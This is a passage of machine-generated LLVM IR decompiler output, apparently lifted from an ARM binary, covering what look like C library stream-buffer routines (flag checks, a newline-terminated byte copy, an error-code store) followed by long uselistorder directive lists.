  %v2_182fc = load i16, i16* %v1_182fc, align 2
  %v3_182fc = zext i16 %v2_182fc to i32
  store i32 %v3_182fc, i32* %r3.global-to-local, align 4
  %v1_18300 = add i32 %v0_182fc, 8
  store i32 %v1_18300, i32* %r1.global-to-local, align 4
  %v1_18304 = inttoptr i32 %v1_18300 to i32*
  %v2_18304 = load i32, i32* %v1_18304, align 4
  store i32 %v2_18304, i32* %r1.global-to-local, align 4
  %v3_18304 = add i32 %v0_182fc, 12
  %v4_18304 = inttoptr i32 %v3_18304 to i32*
  %v5_18304 = load i32, i32* %v4_18304, align 4
  %v1_18308 = or i32 %v3_182fc, 8
  store i32 %v1_18308, i32* %r3.global-to-local, align 4
  %v2_1830c = sub i32 %v5_18304, %v2_18304
  store i32 %v2_1830c, i32* %r2.global-to-local, align 4
  %v9_1830c = icmp eq i32 %v5_18304, %v2_18304
  store i1 %v9_1830c, i1* %cpsr_z.global-to-local, align 1
  %v1_18310 = trunc i32 %v1_18308 to i16
  store i16 %v1_18310, i16* %v1_182fc, align 2
  br i1 %v9_1830c, label %dec_label_pc_182fc.dec_label_pc_1835c_crit_edge, label %dec_label_pc_18318

dec_label_pc_182fc.dec_label_pc_1835c_crit_edge:  ; preds = %dec_label_pc_182fc
  %v0_1835c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1835c

dec_label_pc_18318:                               ; preds = %dec_label_pc_182fc
  %v0_18318 = load i32, i32* %r2.global-to-local, align 4
  %v1_18318 = load i32, i32* %r5.global-to-local, align 4
  %v3_18318 = icmp ult i32 %v0_18318, %v1_18318
  %v9_18318 = icmp eq i32 %v0_18318, %v1_18318
  store i1 %v9_18318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18318, label %.preheader, label %bb23

bb23:                                             ; preds = %dec_label_pc_18318
  store i32 %v1_18318, i32* %r2.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_18318, %bb23
  %v2_1832c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb24

bb24:                                             ; preds = %.preheader, %dec_label_pc_18340
  %v2_1832c = phi i32 [ %v2_1832c.pre, %.preheader ], [ %v1_18344, %dec_label_pc_18340 ]
  %v0_18320 = load i32, i32* %r6.global-to-local, align 4
  %v1_18320 = inttoptr i32 %v0_18320 to i8*
  %v2_18320 = load i8, i8* %v1_18320, align 1
  %v3_18320 = zext i8 %v2_18320 to i32
  store i32 %v3_18320, i32* %r3.global-to-local, align 4
  %v7_18324 = icmp eq i8 %v2_18320, 10
  store i1 %v7_18324, i1* %cpsr_z.global-to-local, align 1
  %v1_18328 = add i32 %v0_18320, 1
  store i32 %v1_18328, i32* %r6.global-to-local, align 4
  %v3_1832c = inttoptr i32 %v2_1832c to i8*
  store i8 %v2_18320, i8* %v3_1832c, align 1
  %v0_18330 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18330, label %dec_label_pc_18334, label %dec_label_pc_18340

dec_label_pc_18334:                               ; preds = %bb24
  %v0_18334 = load i32, i32* %r4.global-to-local, align 4
  %v1_18334 = inttoptr i32 %v0_18334 to i16*
  %v2_18334 = load i16, i16* %v1_18334, align 2
  %v3_18334 = zext i16 %v2_18334 to i32
  store i32 %v3_18334, i32* %r3.global-to-local, align 4
  %v1_18338 = and i32 %v3_18334, 256
  %v2_18338 = icmp eq i32 %v1_18338, 0
  store i1 %v2_18338, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18338, label %dec_label_pc_18340, label %dec_label_pc_18334.dec_label_pc_1834c_crit_edge

dec_label_pc_18334.dec_label_pc_1834c_crit_edge:  ; preds = %dec_label_pc_18334
  %v0_18350.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1834c

dec_label_pc_18340:                               ; preds = %dec_label_pc_18334, %bb24
  %v0_18340 = load i32, i32* %r2.global-to-local, align 4
  %v1_18340 = add i32 %v0_18340, -1
  store i32 %v1_18340, i32* %r2.global-to-local, align 4
  %v7_18340 = icmp eq i32 %v0_18340, 1
  store i1 %v7_18340, i1* %cpsr_z.global-to-local, align 1
  %v0_18344 = load i32, i32* %r1.global-to-local, align 4
  %v1_18344 = add i32 %v0_18344, 1
  store i32 %v1_18344, i32* %r1.global-to-local, align 4
  br i1 %v7_18340, label %dec_label_pc_18340.dec_label_pc_1834c_crit_edge, label %bb24

dec_label_pc_18340.dec_label_pc_1834c_crit_edge:  ; preds = %dec_label_pc_18340
  %v0_1834c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1834c

dec_label_pc_1834c:                               ; preds = %dec_label_pc_18334.dec_label_pc_1834c_crit_edge, %dec_label_pc_18340.dec_label_pc_1834c_crit_edge
  %v0_18350 = phi i32 [ %v1_18344, %dec_label_pc_18340.dec_label_pc_1834c_crit_edge ], [ %v0_18350.pre, %dec_label_pc_18334.dec_label_pc_1834c_crit_edge ]
  %v0_1834c = phi i32 [ %v0_1834c.pre, %dec_label_pc_18340.dec_label_pc_1834c_crit_edge ], [ %v0_18334, %dec_label_pc_18334.dec_label_pc_1834c_crit_edge ]
  %v1_1834c = add i32 %v0_1834c, 8
  %v2_1834c = inttoptr i32 %v1_1834c to i32*
  %v3_1834c = load i32, i32* %v2_1834c, align 4
  store i32 %v3_1834c, i32* %r3.global-to-local, align 4
  %v2_18350 = add i32 %v0_1834c, 16
  %v3_18350 = inttoptr i32 %v2_18350 to i32*
  store i32 %v0_18350, i32* %v3_18350, align 4
  %v0_18354 = load i32, i32* %r3.global-to-local, align 4
  %v1_18354 = load i32, i32* %r1.global-to-local, align 4
  %v2_18354 = sub i32 %v1_18354, %v0_18354
  store i32 %v2_18354, i32* %r3.global-to-local, align 4
  %v1_18358 = load i32, i32* %r5.global-to-local, align 4
  %v2_18358 = sub i32 %v1_18358, %v2_18354
  store i32 %v2_18358, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1835c

dec_label_pc_1835c:                               ; preds = %dec_label_pc_182fc.dec_label_pc_1835c_crit_edge, %dec_label_pc_1834c
  %v0_1835c = phi i32 [ %v0_1835c.pre, %dec_label_pc_182fc.dec_label_pc_1835c_crit_edge ], [ %v2_18358, %dec_label_pc_1834c ]
  %v1_1835c = load i32, i32* @r7, align 4
  %v2_1835c = sub i32 %v1_1835c, %v0_1835c
  br label %dec_label_pc_18360

dec_label_pc_182d0.dec_label_pc_18360.loopexit_crit_edge: ; preds = %dec_label_pc_182d0thread-pre-split
  %v0_18360.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_18360

dec_label_pc_18360:                               ; preds = %dec_label_pc_182b8, %dec_label_pc_182d0.dec_label_pc_18360.loopexit_crit_edge, %dec_label_pc_1835c
  %v0_18360 = phi i32 [ %v2_1835c, %dec_label_pc_1835c ], [ %v0_18360.pre.pre, %dec_label_pc_182d0.dec_label_pc_18360.loopexit_crit_edge ], [ 0, %dec_label_pc_182b8 ]
  %v2_18364 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_18364, i32* %r4.global-to-local, align 4
  ret i32 %v0_18360

; uselistorder directives
  uselistorder i32 %v0_1834c, { 1, 0 }
  uselistorder i32 %v1_18344, { 0, 2, 1 }
  uselistorder i32 %v0_18340, { 1, 0 }
  uselistorder i32 %v1_18318, { 0, 2, 1 }
  uselistorder i32 %v0_18318, { 1, 0 }
  uselistorder i32 %v5_18304, { 1, 0 }
  uselistorder i32 %v2_18304, { 1, 0, 2 }
  uselistorder i32 %v3_182e8, { 2, 3, 0, 1 }
  uselistorder i32 %v0_182e0, { 1, 0 }
  uselistorder i32 %v5_182f4, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 5, 1, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 3, 1, 4, 5, 2, 6, 7, 8, 0 }
  uselistorder i32 256, { 276, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 268, 277, 274, 275, 278, 35, 37, 36, 38, 266, 39, 40, 41, 0, 272, 1, 42, 43, 44, 45, 46, 48, 49, 50, 47, 52, 53, 54, 51, 55, 56, 285, 286, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 71, 70, 72, 73, 271, 74, 75, 76, 77, 279, 78, 79, 80, 81, 82, 280, 83, 84, 85, 86, 281, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 101, 100, 102, 282, 103, 283, 112, 107, 113, 108, 109, 104, 105, 114, 110, 106, 111, 115, 116, 117, 118, 119, 120, 121, 128, 125, 129, 126, 130, 127, 122, 123, 124, 131, 132, 133, 134, 144, 140, 135, 145, 141, 146, 142, 136, 137, 138, 147, 143, 139, 148, 149, 150, 151, 152, 153, 2, 154, 3, 163, 159, 164, 160, 155, 156, 157, 165, 161, 166, 162, 158, 167, 168, 169, 170, 171, 181, 182, 176, 183, 177, 172, 173, 178, 184, 179, 185, 180, 174, 175, 186, 187, 188, 189, 194, 192, 190, 195, 193, 191, 196, 197, 199, 201, 202, 200, 198, 203, 269, 284, 204, 206, 205, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 222, 229, 223, 230, 224, 218, 219, 231, 225, 220, 226, 232, 227, 221, 228, 233, 234, 235, 236, 237, 238, 243, 250, 244, 251, 245, 239, 240, 252, 246, 241, 247, 253, 248, 242, 249, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 273, 265, 267, 287, 270, 288 }
  uselistorder i8 10, { 5, 6, 0, 4, 7, 1, 2, 3 }
  uselistorder i32 (i32, i32)* @function_13058, { 2, 0, 1 }
  uselistorder i32 4, { 215, 216, 217, 209, 210, 368, 218, 485, 4, 5, 219, 6, 7, 74, 0, 8, 85, 80, 81, 9, 486, 82, 487, 67, 10, 11, 83, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 12, 505, 506, 507, 508, 509, 510, 66, 511, 512, 513, 514, 515, 516, 13, 14, 84, 517, 220, 102, 221, 15, 222, 103, 223, 224, 225, 226, 145, 227, 228, 229, 230, 231, 232, 16, 211, 212, 213, 214, 274, 275, 204, 205, 206, 207, 208, 518, 146, 104, 519, 17, 520, 147, 148, 68, 414, 415, 416, 417, 418, 419, 149, 150, 18, 420, 421, 422, 423, 424, 425, 426, 427, 151, 412, 413, 370, 371, 372, 373, 374, 375, 376, 377, 378, 19, 379, 380, 381, 428, 20, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 152, 153, 154, 443, 444, 447, 450, 445, 446, 105, 155, 448, 58, 449, 451, 452, 453, 455, 156, 22, 21, 454, 157, 158, 159, 261, 160, 59, 23, 24, 276, 277, 278, 279, 280, 25, 281, 456, 457, 203, 26, 27, 458, 459, 202, 28, 29, 106, 233, 69, 30, 254, 107, 255, 161, 256, 383, 384, 31, 385, 86, 108, 109, 234, 235, 257, 258, 237, 238, 239, 111, 251, 252, 253, 236, 110, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 259, 260, 62, 61, 386, 75, 387, 32, 388, 64, 63, 389, 33, 382, 390, 391, 396, 112, 397, 113, 398, 114, 399, 115, 400, 116, 401, 117, 118, 403, 404, 402, 392, 119, 393, 394, 395, 265, 162, 266, 60, 34, 267, 268, 35, 269, 70, 76, 120, 270, 271, 343, 282, 262, 263, 264, 36, 121, 37, 38, 122, 123, 124, 163, 272, 125, 273, 39, 283, 284, 285, 164, 286, 287, 288, 289, 165, 166, 126, 290, 127, 291, 87, 292, 293, 294, 167, 295, 296, 168, 169, 297, 88, 298, 89, 299, 300, 170, 301, 302, 171, 172, 303, 128, 304, 90, 305, 173, 174, 175, 306, 307, 129, 91, 308, 309, 176, 310, 311, 312, 177, 178, 1, 130, 313, 92, 314, 315, 316, 179, 317, 318, 180, 181, 2, 131, 319, 93, 320, 94, 321, 322, 323, 324, 182, 325, 326, 183, 184, 327, 328, 132, 329, 3, 330, 95, 331, 133, 332, 333, 334, 335, 336, 185, 337, 338, 186, 187, 135, 339, 134, 340, 96, 341, 97, 342, 344, 345, 346, 347, 348, 137, 349, 138, 350, 188, 351, 65, 352, 189, 190, 139, 353, 136, 354, 98, 355, 99, 356, 191, 40, 357, 192, 41, 358, 193, 42, 359, 194, 43, 360, 195, 77, 44, 361, 362, 196, 45, 363, 197, 46, 364, 198, 47, 365, 199, 48, 366, 200, 49, 367, 460, 369, 405, 406, 407, 408, 409, 410, 201, 411, 461, 462, 463, 100, 464, 78, 465, 466, 467, 468, 101, 469, 140, 470, 471, 472, 79, 473, 141, 474, 50, 51, 52, 53, 54, 475, 476, 477, 55, 73, 72, 71, 478, 56, 57, 142, 479, 143, 480, 481, 482, 144, 483, 484 }
  uselistorder i32 2147483647, { 1, 6, 0, 2, 3, 4, 5 }
  uselistorder i32* @r7, { 2, 33, 34, 22, 23, 24, 25, 26, 27, 28, 29, 32, 3, 35, 36, 37, 4, 38, 39, 40, 17, 41, 42, 5, 43, 44, 45, 46, 47, 48, 6, 49, 50, 51, 52, 53, 54, 30, 31, 336, 337, 258, 259, 260, 261, 21, 338, 339, 340, 345, 346, 7, 55, 56, 8, 96, 97, 98, 0, 99, 262, 263, 264, 265, 266, 267, 268, 269, 270, 227, 228, 229, 230, 231, 232, 271, 272, 273, 274, 275, 276, 277, 278, 9, 279, 280, 281, 282, 283, 284, 285, 286, 287, 100, 101, 233, 234, 288, 289, 170, 171, 77, 113, 114, 115, 116, 117, 122, 123, 124, 125, 126, 118, 119, 120, 121, 127, 128, 129, 130, 131, 132, 290, 291, 343, 344, 78, 79, 80, 292, 293, 341, 342, 149, 150, 133, 134, 81, 82, 252, 253, 102, 103, 294, 295, 296, 297, 298, 135, 136, 137, 138, 139, 299, 300, 19, 301, 57, 58, 59, 60, 61, 62, 63, 64, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 65, 235, 236, 237, 238, 239, 240, 241, 86, 87, 88, 89, 90, 91, 83, 84, 85, 92, 93, 94, 95, 104, 105, 10, 106, 107, 108, 109, 110, 111, 112, 140, 141, 142, 143, 144, 145, 146, 147, 148, 151, 152, 153, 154, 155, 156, 157, 158, 11, 159, 160, 161, 162, 163, 164, 165, 166, 12, 167, 168, 169, 14, 13, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 20, 185, 186, 187, 188, 189, 190, 191, 1, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 244, 242, 243, 18, 245, 246, 247, 248, 249, 250, 251, 254, 255, 256, 257, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 15, 326, 327, 328, 329, 330, 331, 332, 333, 16, 334, 335 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_18360, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1835c, { 1, 0 }
  uselistorder label %dec_label_pc_1834c, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_182d8, { 1, 0 }
}

define i32 @function_1836c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1836c:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1836c = load i32, i32* @r4, align 4
  store i32 %v3_1836c, i32* %stack_var_-8, align 4
  %v1_18370 = add i32 %arg1, 8
  %v1_18374 = inttoptr i32 %v1_18370 to i32*
  %v2_18374 = load i32, i32* %v1_18374, align 4
  %v3_18374 = add i32 %arg1, 12
  %v4_18374 = inttoptr i32 %v3_18374 to i32*
  %v5_18374 = load i32, i32* %v4_18374, align 4
  %v2_18378 = sub i32 %v5_18374, %v2_18374
  store i32 %v2_18378, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_18380 = inttoptr i32 %arg1 to i16*
  %v4_18380 = call i32 @function_18260(i16* %v3_18380, i32 %v2_18374, i32 %v2_18378)
  %v0_18384 = load i32, i32* @r4, align 4
  %v1_18384 = add i32 %v0_18384, 8
  %v2_18384 = inttoptr i32 %v1_18384 to i32*
  %v3_18384 = load i32, i32* %v2_18384, align 4
  store i32 %v3_18384, i32* %r2.global-to-local, align 4
  %v2_18388 = add i32 %v3_18384, %v4_18380
  %v2_1838c = add i32 %v0_18384, 20
  %v3_1838c = inttoptr i32 %v2_1838c to i32*
  store i32 %v2_18388, i32* %v3_1838c, align 4
  %v0_18390 = load i32, i32* %r2.global-to-local, align 4
  %v1_18390 = load i32, i32* @r4, align 4
  %v2_18390 = add i32 %v1_18390, 16
  %v3_18390 = inttoptr i32 %v2_18390 to i32*
  store i32 %v0_18390, i32* %v3_18390, align 4
  %v2_18394 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18394, i32* @r4, align 4
  ret i32 %v4_18380

; uselistorder directives
  uselistorder i32 %v4_18380, { 1, 0 }
  uselistorder i32 20, { 30, 115, 3, 116, 117, 1, 118, 31, 7, 32, 33, 34, 35, 29, 40, 41, 25, 26, 27, 28, 119, 8, 120, 97, 98, 110, 2, 42, 9, 43, 44, 0, 39, 10, 36, 11, 37, 12, 38, 100, 101, 4, 102, 13, 103, 24, 99, 45, 14, 46, 47, 48, 49, 50, 51, 15, 52, 53, 54, 55, 56, 57, 16, 58, 59, 60, 61, 62, 63, 64, 65, 66, 17, 67, 68, 69, 70, 71, 72, 73, 74, 18, 75, 76, 77, 78, 79, 80, 19, 81, 82, 20, 83, 84, 85, 86, 87, 5, 88, 21, 89, 90, 91, 92, 6, 93, 22, 94, 95, 96, 104, 105, 106, 107, 108, 109, 111, 112, 113, 23, 114 }
  uselistorder i32 12, { 11, 12, 40, 13, 14, 43, 8, 168, 169, 170, 171, 172, 174, 175, 173, 176, 177, 178, 179, 180, 181, 182, 15, 16, 17, 18, 20, 19, 21, 44, 45, 22, 46, 47, 48, 49, 50, 41, 42, 67, 68, 37, 38, 39, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 3, 98, 99, 100, 101, 102, 23, 103, 137, 24, 25, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 156, 149, 150, 151, 152, 153, 154, 155, 157, 158, 26, 159, 5, 69, 70, 27, 71, 72, 9, 51, 61, 62, 104, 105, 63, 53, 59, 60, 52, 54, 55, 56, 57, 58, 64, 106, 107, 108, 7, 109, 110, 111, 112, 114, 115, 116, 119, 118, 113, 6, 28, 29, 65, 66, 4, 30, 31, 32, 33, 117, 73, 34, 74, 75, 76, 77, 78, 79, 80, 35, 81, 82, 83, 36, 84, 85, 86, 87, 88, 89, 10, 90, 91, 92, 93, 94, 95, 96, 97, 0, 1, 2, 160, 161, 162, 163, 164, 166, 165, 167 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @function_1839c() local_unnamed_addr {
dec_label_pc_1839c:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1839c = load i32, i32* @r4, align 4
  store i32 %v3_1839c, i32* %stack_var_-12, align 4
  %v0_183a0 = load i32, i32* @r0, align 4
  %v1_183a0 = inttoptr i32 %v0_183a0 to i16*
  %v2_183a0 = load i16, i16* %v1_183a0, align 2
  %v3_183a0 = zext i16 %v2_183a0 to i32
  store i32 %v3_183a0, i32* %r3.global-to-local, align 4
  %v0_183a4 = load i32, i32* @r1, align 4
  %v2_183a4 = and i32 %v0_183a4, %v3_183a0
  %v4_183a4 = icmp eq i32 %v2_183a4, 0
  store i32 %v0_183a0, i32* @r4, align 4
  br i1 %v4_183a4, label %dec_label_pc_183b4, label %dec_label_pc_183c4

dec_label_pc_183b4:                               ; preds = %dec_label_pc_1839c
  %v1_183b4 = and i32 %v3_183a0, 2176
  %v2_183b4 = icmp eq i32 %v1_183b4, 0
  br i1 %v2_183b4, label %dec_label_pc_183bc, label %dec_label_pc_183d0

dec_label_pc_183bc:                               ; preds = %dec_label_pc_183b4
  %v2_183bc = or i32 %v0_183a4, %v3_183a0
  store i32 %v2_183bc, i32* %r3.global-to-local, align 4
  %v1_183c0 = trunc i32 %v2_183bc to i16
  store i16 %v1_183c0, i16* %v1_183a0, align 2
  %v0_183c4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_183c4

dec_label_pc_183c4:                               ; preds = %dec_label_pc_1839c, %dec_label_pc_183bc
  %v0_183c4 = phi i32 [ %v0_183a0, %dec_label_pc_1839c ], [ %v0_183c4.pre, %dec_label_pc_183bc ]
  %v1_183c4 = inttoptr i32 %v0_183c4 to i16*
  %v2_183c4 = load i16, i16* %v1_183c4, align 2
  %v3_183c4 = zext i16 %v2_183c4 to i32
  store i32 %v3_183c4, i32* %r3.global-to-local, align 4
  %v1_183c8 = and i32 %v3_183c4, 16
  store i32 %v1_183c8, i32* %r5.global-to-local, align 4
  %v2_183c8 = icmp eq i32 %v1_183c8, 0
  br i1 %v2_183c8, label %dec_label_pc_183f0, label %dec_label_pc_183d0

dec_label_pc_183d0:                               ; preds = %dec_label_pc_183b4, %dec_label_pc_183c4
  %v0_183d0 = call i32 @function_13574()
  store i32 %v0_183d0, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_183d8 = inttoptr i32 %v0_183d0 to i32*
  store i32 9, i32* %v2_183d8, align 4
  br label %dec_label_pc_183dc

dec_label_pc_183dc:                               ; preds = %dec_label_pc_183f8, %dec_label_pc_183d0
  %v0_183dc = load i32, i32* @r4, align 4
  %v1_183dc = inttoptr i32 %v0_183dc to i16*
  %v2_183dc = load i16, i16* %v1_183dc, align 2
  %v3_183dc = zext i16 %v2_183dc to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_183e4 = or i32 %v3_183dc, 8
  store i32 %v1_183e4, i32* %r3.global-to-local, align 4
  %v1_183e8 = trunc i32 %v1_183e4 to i16
  store i16 %v1_183e8, i16* %v1_183dc, align 2
  %v1_18430.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18428

dec_label_pc_183f0:                               ; preds = %dec_label_pc_183c4
  %v1_183f0 = and i32 %v3_183c4, 64
  %v2_183f0 = icmp eq i32 %v1_183f0, 0
  br i1 %v2_183f0, label %dec_label_pc_18418, label %dec_label_pc_183f8

dec_label_pc_183f8:                               ; preds = %dec_label_pc_183f0
  %v0_183f8 = load i32, i32* @r0, align 4
  %v1_183f8 = call i32 @function_16fd0(i32 %v0_183f8)
  store i32 %v1_183f8, i32* %r0.global-to-local, align 4
  %v2_183fc = icmp eq i32 %v1_183f8, 0
  br i1 %v2_183fc, label %dec_label_pc_18404, label %dec_label_pc_183dc

dec_label_pc_18404:                               ; preds = %dec_label_pc_183f8
  %v0_18404 = load i32, i32* @r4, align 4
  %v1_18404 = inttoptr i32 %v0_18404 to i16*
  %v2_18404 = load i16, i16* %v1_18404, align 2
  %v3_18404 = zext i16 %v2_18404 to i32
  store i32 %v3_18404, i32* %r3.global-to-local, align 4
  %v1_18408 = add i32 %v0_18404, 8
  %v2_18408 = inttoptr i32 %v1_18408 to i32*
  %v3_18408 = load i32, i32* %v2_18408, align 4
  %v1_1840c = and i32 %v3_18404, 65471
  store i32 %v1_1840c, i32* %r3.global-to-local, align 4
  %v2_18410 = add i32 %v0_18404, 28
  %v3_18410 = inttoptr i32 %v2_18410 to i32*
  store i32 %v3_18408, i32* %v3_18410, align 4
  %v0_18414 = load i32, i32* %r3.global-to-local, align 4
  %v1_18414 = trunc i32 %v0_18414 to i16
  %v2_18414 = load i32, i32* @r4, align 4
  %v3_18414 = inttoptr i32 %v2_18414 to i16*
  store i16 %v1_18414, i16* %v3_18414, align 2
  %v0_18418.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18418

dec_label_pc_18418:                               ; preds = %dec_label_pc_183f0, %dec_label_pc_18404
  %v2_18420 = phi i32 [ %v0_183c4, %dec_label_pc_183f0 ], [ %v0_18418.pre, %dec_label_pc_18404 ]
  %v1_18418 = inttoptr i32 %v2_18420 to i16*
  %v2_18418 = load i16, i16* %v1_18418, align 2
  %v3_18418 = zext i16 %v2_18418 to i32
  %v1_1841c = or i32 %v3_18418, 1
  store i32 %v1_1841c, i32* %r3.global-to-local, align 4
  %v1_18420 = trunc i32 %v1_1841c to i16
  store i16 %v1_18420, i16* %v1_18418, align 2
  %v0_18424 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_18424, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18428

dec_label_pc_18428:                               ; preds = %dec_label_pc_183dc, %dec_label_pc_18418
  %v1_18430 = phi i32 [ %v1_18430.pre, %dec_label_pc_183dc ], [ %v0_18424, %dec_label_pc_18418 ]
  %v2_1842c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1842c, i32* @r4, align 4
  ret i32 %v1_18430

; uselistorder directives
  uselistorder i32 %v3_183a0, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 28, { 19, 44, 7, 20, 21, 22, 30, 31, 17, 10, 18, 11, 12, 13, 14, 39, 40, 43, 8, 15, 0, 23, 1, 24, 2, 25, 3, 26, 4, 27, 5, 28, 6, 29, 9, 16, 42, 41, 32, 33, 34, 35, 36, 37, 38 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_16fd0, { 2, 1, 0 }
  uselistorder i32 64, { 14, 15, 16, 17, 20, 10, 11, 12, 13, 50, 49, 5, 18, 6, 19, 21, 22, 7, 23, 24, 25, 0, 26, 27, 28, 8, 29, 30, 31, 9, 32, 33, 34, 1, 35, 36, 37, 2, 38, 39, 40, 41, 42, 3, 43, 44, 45, 46, 47, 4, 48 }
  uselistorder i32 8, { 93, 94, 95, 96, 97, 98, 99, 86, 87, 88, 89, 171, 100, 245, 46, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 101, 102, 103, 104, 105, 106, 107, 33, 108, 109, 110, 111, 112, 113, 114, 115, 116, 90, 91, 92, 123, 124, 125, 65, 263, 264, 265, 73, 36, 190, 191, 192, 193, 194, 195, 196, 197, 6, 74, 198, 199, 200, 201, 202, 203, 204, 205, 7, 172, 173, 174, 175, 176, 177, 178, 179, 206, 207, 208, 209, 210, 8, 211, 212, 9, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 230, 223, 224, 225, 226, 75, 27, 227, 228, 229, 76, 77, 10, 231, 232, 233, 234, 236, 237, 78, 11, 238, 12, 235, 49, 50, 47, 48, 29, 30, 43, 44, 51, 266, 126, 127, 128, 129, 66, 81, 37, 13, 14, 25, 15, 80, 38, 16, 17, 26, 18, 52, 117, 118, 19, 20, 21, 180, 67, 119, 82, 45, 181, 182, 183, 28, 31, 185, 22, 68, 186, 187, 184, 120, 121, 69, 122, 23, 70, 130, 53, 131, 132, 133, 134, 135, 136, 137, 138, 3, 139, 140, 141, 4, 142, 143, 144, 145, 146, 147, 148, 5, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 54, 161, 55, 162, 56, 163, 57, 164, 58, 165, 59, 166, 60, 167, 61, 168, 62, 169, 71, 170, 0, 1, 79, 24, 188, 72, 189, 2, 34, 39, 40, 35, 41, 42, 239, 83, 84, 240, 241, 242, 63, 243, 32, 85, 64, 244 }
  uselistorder i32 9, { 8, 37, 32, 33, 61, 66, 9, 47, 5, 67, 6, 38, 39, 40, 10, 11, 41, 34, 62, 3, 35, 63, 36, 12, 65, 13, 42, 43, 2, 14, 44, 45, 15, 46, 0, 16, 17, 18, 19, 1, 20, 21, 64, 48, 49, 22, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 4, 60, 30, 29, 28, 27, 26, 25, 24, 23, 31, 68, 69, 7, 70 }
  uselistorder i32 16, { 105, 106, 107, 99, 100, 101, 102, 108, 36, 37, 38, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 109, 110, 111, 112, 113, 2, 1, 29, 48, 49, 50, 51, 116, 52, 117, 114, 115, 53, 54, 118, 9, 55, 56, 119, 120, 57, 58, 121, 122, 103, 104, 59, 132, 133, 95, 96, 97, 98, 60, 30, 129, 39, 61, 62, 63, 202, 203, 204, 205, 64, 215, 3, 65, 216, 217, 0, 218, 219, 66, 28, 134, 67, 135, 68, 69, 10, 26, 11, 12, 4, 13, 14, 15, 27, 16, 17, 5, 18, 19, 70, 206, 71, 123, 124, 72, 125, 207, 126, 210, 211, 212, 40, 94, 73, 74, 20, 91, 21, 22, 75, 208, 209, 76, 127, 41, 128, 42, 77, 78, 79, 80, 81, 82, 130, 83, 131, 43, 213, 84, 136, 137, 138, 139, 31, 140, 141, 142, 143, 144, 32, 145, 146, 147, 148, 85, 44, 149, 150, 33, 151, 152, 23, 153, 154, 6, 86, 155, 156, 157, 34, 158, 159, 160, 161, 162, 7, 87, 163, 35, 164, 165, 166, 24, 167, 168, 92, 25, 93, 169, 88, 89, 170, 171, 8, 46, 172, 45, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 185, 184, 186, 187, 188, 189, 190, 191, 192, 